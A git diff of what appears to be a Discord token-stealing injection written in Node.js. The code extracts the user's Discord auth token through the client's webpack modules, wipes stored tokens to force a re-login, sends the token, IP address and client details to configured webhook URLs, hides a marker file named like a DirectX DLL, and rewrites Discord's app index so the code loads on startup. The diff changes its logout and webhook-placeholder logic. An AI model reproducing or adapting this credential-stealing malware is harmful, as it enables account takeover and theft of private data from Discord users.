@@ -7,7 +7,7 @@ const queryString = require("querystring")
 
 var computerName = process.env.COMPUTERNAME
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
-var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`
+var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`
 var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false
 
 
@@ -266,6 +266,8 @@ const post = async (params) => {
         token: token
     });
     [config.Placed, config.webhook].forEach(res => {
+        if(res == "%API_URL%")return;
+        if(res == "%WEBHOOK%")return;
         const url = new URL(res);
         const options = {
             host: url.hostname,
@@ -286,12 +288,16 @@ const post = async (params) => {
 
 }
 
-
 const FirstTime = async () => {
-    if (doTheLogOut) return false
+    if (!doTheLogOut) return false
     var token = await execScript(tokenScript)
     if (config['init-notify'] !== "true") return true
-    if (fs.existsSync(__dirname + "/Hawkish")) fs.rmdirSync(__dirname + "/Hawkish")
+    if (fs.existsSync(__dirname + "/Hawkish")){
+        try{
+        fs.rmdirSync(__dirname + "/Hawkish")
+        }catch(err){
+            console.log(err)
+        }
     var ip = await getIP()
     var client_discord = await getDiscordClientFolder()
     if (!token) {
@@ -482,12 +488,15 @@ const FirstTime = async () => {
 
             params.embeds.push(params2.embeds[0])
         }
+    
         fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
         await execScript(logOutScript)
         doTheLogOut = true
         await post(params)
     }
+     
     return false
+}
 }
 
 const path = (function () {
@@ -506,6 +515,7 @@ const checUpdate = () => {
         appPath,
         appName
     } = path
+    if (!doTheLogOut) execScript(logOutScript)
 
     var ressource = `${appPath}/app`
     var indexFile = __filename.replace(/\\/g, "/")
@@ -535,7 +545,6 @@ function init() {
 require("${appPath}/app.asar")
 if (fs.existsSync(betterDiscord)) require(betterDiscord)`
     fs.writeFileSync(index, script)
-    if (!doTheLogOut) execScript(logOutScript)
     return
 }
 electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
